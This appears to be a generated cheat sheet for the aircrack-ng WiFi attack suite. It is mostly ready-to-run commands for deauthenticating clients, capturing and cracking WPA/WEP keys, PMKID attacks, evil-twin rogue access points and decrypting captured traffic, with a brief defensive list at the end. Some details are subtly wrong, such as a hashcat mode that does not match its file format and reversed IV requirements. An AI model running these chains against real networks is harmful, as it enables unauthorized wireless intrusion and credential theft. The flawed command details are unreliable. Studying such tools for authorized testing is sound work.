---
title: aircrack-ng
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - wpa
  - wep
  - cracking
  - handshake
  - deauthentication
  - monitor_mode
  - 802.11
difficulty: intermediate
os: linux
install: sudo apt install aircrack-ng
github: https://github.com/aircrack-ng/aircrack-ng
related:
  - wifite
  - reaver
  - pixiewps
  - airgeddon
---

# aircrack-ng

## Chapter 1: Overview

**aircrack-ng** is a complete suite of tools to assess WiFi network security. It contains a full 802.11a/b/g WEP and WPA/WPA2 cracking suite, packet capture and analysis tools, and various attack utilities. The suite focuses on monitoring, attacking, testing, and cracking WiFi networks.

### Core Components

| Tool | Purpose |
|------|---------|
| **airmon-ng** | Enable/disable monitor mode on wireless interfaces |
| **airodump-ng** | Packet capture and wireless network discovery |
| **aireplay-ng** | Packet injection and deauthentication attacks |
| **aircrack-ng** | WEP/WPA key cracking from capture files |
| **airdecap-ng** | Decrypt WEP/WPA encrypted capture files |
| **airbase-ng** | Rogue access point creation (evil twin) |
| **airtun-ng** | Virtual tunnel interface creator |
| **airserv-ng** | Wireless card server for remote access |

### Supported Attacks

- **WEP Cracking**: PTW attack, FMS attack, KoreK attacks
- **WPA/WPA2-PSK**: Dictionary attack, PMKID attack, hashcat conversion
- **WPS**: Integration with reaver/pixiewps
- **Deauthentication**: Targeted and broadcast deauth
- **Evil Twin**: Rogue AP with various attack vectors
- **Fragmentation**: Keystream recovery attacks

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install aircrack-ng
```

**Install size**: 2.47 MB

**Dependencies**: ethtool, hwloc, iw, libpcap0.8, python3, rfkill

### Verify Installation

```bash
aircrack-ng --help
airmon-ng --version
```

### Enable Monitor Mode

```bash
# Check for interfering processes
airmon-ng check

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0

# Verify monitor interface
iwconfig
```

---

## Chapter 3: Network Discovery

### Scan All Networks

```bash
airodump-ng wlan0mon
```

**Output fields**: BSSID, PWR (signal), Beacons, #Data, CH, ENC, CIPHER, AUTH, ESSID

### Target Specific Network

```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### Filter by Manufacturer

```bash
airodump-ng -d FC:15:B4:00:00:00 -m FF:FF:FF:00:00:00 wlan0mon
```

### Capture Handshake

```bash
# Terminal 1: Capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Force handshake with deauth
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## Chapter 4: WEP Cracking

### Capture IVs

```bash
# Start capture on target
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# In another terminal, inject to generate traffic
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
```

### Crack WEP Key

```bash
# Standard attack (needs ~20,000 IVs minimum)
aircrack-ng wep_capture-01.cap

# PTW attack (needs ~40,000 IVs)
aircrack-ng -z wep_capture-01.cap

# With specific key length
aircrack-ng -n 128 wep_capture-01.cap
```

### Convert Capture Format

```bash
# Convert pcap to ivs
ivstools --convert capture.pcap capture.ivs

# Merge multiple ivs files
ivstools --merge *.ivs merged.ivs
```

---

## Chapter 5: WPA/WPA2 Cracking

### Capture 4-Way Handshake

```bash
# Start targeted capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Deauth client to force handshake
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Verify Handshake

```bash
aircrack-ng wpa_capture-01.cap
```

### Dictionary Attack

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap
```

### PMKID Attack (No Client Required)

```bash
# Capture PMKID
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng

# Convert to hashcat format
hcxpcapngtool -o pmkid_hash.hc22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid_hash.hc22000 wordlist.txt
```

### Pre-computed PMK Database

```bash
# Import ESSIDs
airolib-ng database --import essid essids.txt

# Import passwords
airolib-ng database --import passwd wordlist.txt

# Compute PMKs
airolib-ng database --batch

# Crack using database
aircrack-ng -r database wpa_capture-01.cap
```

---

## Chapter 6: Advanced Attacks

### Evil Twin (airbase-ng)

```bash
# Create rogue AP
airbase-ng -c 6 -e "FreeWiFi" wlan0mon

# Configure interface
ifconfig at0 10.0.0.1 netmask 255.255.255.0 up

# Start DHCP
dnsmasq -C /etc/dnsmasq.conf
```

### Deauthentication Attack

```bash
# Targeted deauth
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Continuous deauth
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Injection Test

```bash
# Test injection capability
aireplay-ng -9 wlan0mon
```

### Decrypt Captured Traffic

```bash
# With WPA passphrase
airdecap-ng -e "NetworkName" -p "password" capture.pcap

# With PMK
airdecap-ng -e "NetworkName" -k <pmk_hex> capture.pcap
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Test WPA2 Network Security

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w test_capture wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt test_capture-01.cap
```

### Scenario 2: WEP Network Audit

```bash
airmon-ng start wlan0
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_audit wlan0mon
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# Wait for 50,000+ IVs
aircrack-ng wep_audit-01.cap
```

### Scenario 3: Automated Assessment

```bash
# Use wifite for automated attacks
wifite --wpa --dict /usr/share/wordlists/rockyou.txt
```

---

## Chapter 8: Mitigation & Defense

**For network administrators:**

- **Disable WPS**: Prevents reaver/pixiewps attacks
- **Use WPA3**: Stronger encryption and PMKID protection
- **Strong Passphrases**: 20+ characters with mixed complexity
- **Network Segmentation**: Isolate guest networks
- **Monitor for Rogue APs**: Detect evil twin attacks
- **MAC Filtering**: Basic deterrent (not security measure)
- **802.1X Enterprise**: Certificate-based authentication

---

## Resources

- [aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Aircrack-ng Tutorial](https://www.aircrack-ng.org/doku.php?id=getting_started)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)
- [WiFi Security Best Practices](https://www.cisa.gov/news-events/cybersecurity-advisories)
- [Kali Linux WiFi Tools](https://www.kali.org/tools/aircrack-ng/)

---

*Generated for educational purposes in authorized security testing environments only.*
